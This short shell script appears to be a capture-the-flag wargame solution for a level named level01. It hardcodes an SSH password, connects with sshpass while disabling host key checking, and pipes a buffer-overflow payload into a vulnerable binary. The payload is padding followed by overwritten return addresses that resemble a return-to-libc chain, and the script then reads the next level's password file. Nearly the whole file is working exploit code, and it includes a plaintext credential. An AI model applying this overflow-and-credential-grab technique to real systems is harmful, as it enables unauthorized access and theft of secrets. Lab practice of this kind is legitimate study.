#!/bin/sh

PASS='uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level01@$OVERRIDE -p 4242 << EOF
SHELL=/bin/sh
(python -c "print 'dat_wil\n' + 'A'*80 + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'";echo 'cat /home/users/level02/.pass') | ./level01
EOF